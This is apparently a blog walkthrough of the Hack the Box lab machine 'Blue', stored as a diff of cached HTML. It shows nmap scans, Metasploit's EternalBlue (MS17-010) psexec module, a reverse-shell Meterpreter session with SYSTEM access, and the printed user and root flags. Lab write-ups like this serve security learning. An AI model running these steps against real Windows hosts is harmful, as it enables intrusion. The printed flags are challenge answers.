@@ -1,0 +1,84 @@
+I"�#<p>Blue is an easy level machine in the Hack the Box retired archives. This machine requires a simple enumeration scan to identify services and versions, and knowledge of using pre-configured metasploit modules to exploit a well-known vulnerability. The title of this box should be a major clue to what vulnerabilities might exist.</p>
+
+<h2 id="enumeration">Enumeration</h2>
+
+<p>First, I used nmap and the nmapAutomator script to search the target for open ports, running services, and their corresponding service versions.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/blue]
+└─<span class="nv">$ </span>nmapAutomator.sh 10.10.10.226 All
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb/blue]
+└─<span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sV</span> <span class="nt">-A</span> <span class="nt">-O</span> <span class="nt">--top-ports</span> 200 10.10.10.40                                                                                                    1 ⨯
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>kali: 
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-03-04 15:24 EST
+Nmap scan report <span class="k">for </span>10.10.10.40
+Host is up <span class="o">(</span>0.055s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 191 closed ports
+PORT      STATE SERVICE      VERSION
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+49152/tcp open  msrpc        Microsoft Windows RPC
+49153/tcp open  msrpc        Microsoft Windows RPC
+49154/tcp open  msrpc        Microsoft Windows RPC
+49155/tcp open  msrpc        Microsoft Windows RPC
+49156/tcp open  msrpc        Microsoft Windows RPC
+49157/tcp open  msrpc        Microsoft Windows RPC
+</code></pre></div></div>
+
+<p>The resulting output shows the target was running windows microsoft-ds,netbios, and msrpc. I had a feeling this machine was vulnerable to eternal blue due to the box title. To check my assumption, I opened up metasploit and used a <code class="language-plaintext highlighter-rouge">check</code> option in one of the ms17_010 related modules. After setting the RHOST to the target, the check revealed it was likely vulnerable.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 exploit<span class="o">(</span>windows/smb/ms17_010_psexec<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>RHOSTS 10.10.10.40
+RHOSTS <span class="o">=&gt;</span> 10.10.10.40
+msf6 exploit<span class="o">(</span>windows/smb/ms17_010_psexec<span class="o">)</span> <span class="o">&gt;</span> check
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+<span class="o">[</span>+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 <span class="o">(</span>64-bit<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 10.10.10.40:445       - Scanned 1 of 1 hosts <span class="o">(</span>100% <span class="nb">complete</span><span class="o">)</span>
+<span class="o">[</span>+] 10.10.10.40:445 - The target is vulnerable.
+msf6 exploit<span class="o">(</span>windows/smb/ms17_010_psexec<span class="o">)</span> <span class="o">&gt;</span> 
+</code></pre></div></div>
+
+<h2 id="selecting-a-public-exploit">Selecting a Public Exploit</h2>
+
+<p>There are a few metasploit modules which can be used to root a machine vulnerable to eternal blue, i decided to use the <code class="language-plaintext highlighter-rouge">windows/smb/ms17_010_psexec</code> module. After opening the msfconsole, and selecting the psexec module, I configured the options to use the target as the RHOST and my machine as the LHOST. Running the exploit was successful.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 exploit<span class="o">(</span>windows/smb/ms17_010_psexec<span class="o">)</span> <span class="o">&gt;</span> run
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 10.10.14.13:4444 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 10.10.10.40:445 - Target OS: Windows 7 Professional 7601 Service Pack 1
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 10.10.10.40:445 - Built a write-what-where primitive...
+<span class="o">[</span>+] 10.10.10.40:445 - Overwrite complete... SYSTEM session obtained!
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 10.10.10.40:445 - Selecting PowerShell target
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 10.10.10.40:445 - Executing the payload...
+<span class="o">[</span>+] 10.10.10.40:445 - Service start timed out, OK <span class="k">if </span>running a <span class="nb">command </span>or non-service executable...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sending stage <span class="o">(</span>175174 bytes<span class="o">)</span> to 10.10.10.40
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Meterpreter session 1 opened <span class="o">(</span>10.10.14.13:4444 -&gt; 10.10.10.40:49161<span class="o">)</span> at 2021-03-04 15:11:16 <span class="nt">-0500</span>
+
+meterpreter <span class="o">&gt;</span> getsystem
+...got system via technique 1 <span class="o">(</span>Named Pipe Impersonation <span class="o">(</span>In Memory/Admin<span class="o">))</span><span class="nb">.</span>
+</code></pre></div></div>
+
+<h2 id="finding-flags">Finding Flags</h2>
+
+<p>I stayed in the meterpreter shell to navigate the target and search for flags. Using the search meterpreter command, I found both the user and root flag files.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter <span class="o">&gt;</span> search <span class="nt">-f</span> <span class="k">*</span>user.txt<span class="k">*</span>
+Found 3 results...
+    c:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\R</span>ecent<span class="se">\u</span>ser.txt.lnk <span class="o">(</span>909 bytes<span class="o">)</span>
+    c:<span class="se">\U</span>sers<span class="se">\h</span>aris<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\R</span>ecent<span class="se">\u</span>ser.txt.lnk <span class="o">(</span>556 bytes<span class="o">)</span>
+    c:<span class="se">\U</span>sers<span class="se">\h</span>aris<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt <span class="o">(</span>32 bytes<span class="o">)</span>
+meterpreter <span class="o">&gt;</span> <span class="nb">type</span> <span class="s2">"c:</span><span class="se">\U</span><span class="s2">sers</span><span class="se">\h</span><span class="s2">aris</span><span class="se">\D</span><span class="s2">esktop</span><span class="se">\u</span><span class="s2">ser.txt"</span>
+<span class="o">[</span>-] Unknown <span class="nb">command</span>: type.
+meterpreter <span class="o">&gt;</span> <span class="nb">cat</span> <span class="s2">"c:</span><span class="se">\U</span><span class="s2">sers</span><span class="se">\h</span><span class="s2">aris</span><span class="se">\D</span><span class="s2">esktop</span><span class="se">\u</span><span class="s2">ser.txt"</span>
+4c546aea7dbee75cbd71de245c8deea9meterpreter <span class="o">&gt;</span> 
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter <span class="o">&gt;</span> search <span class="nt">-f</span> <span class="s2">"root.txt"</span>
+Found 1 result...
+    c:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt <span class="o">(</span>32 bytes<span class="o">)</span>
+meterpreter <span class="o">&gt;</span> <span class="nb">cat</span> <span class="s2">"c:</span><span class="se">\U</span><span class="s2">sers</span><span class="se">\A</span><span class="s2">dministrator</span><span class="se">\D</span><span class="s2">esktop</span><span class="se">\r</span><span class="s2">oot.txt"</span>
+ff548eb71e920ff6c08843ce9df4e717meterpreter <span class="o">&gt;</span> 
+</code></pre></div></div>
+:ET
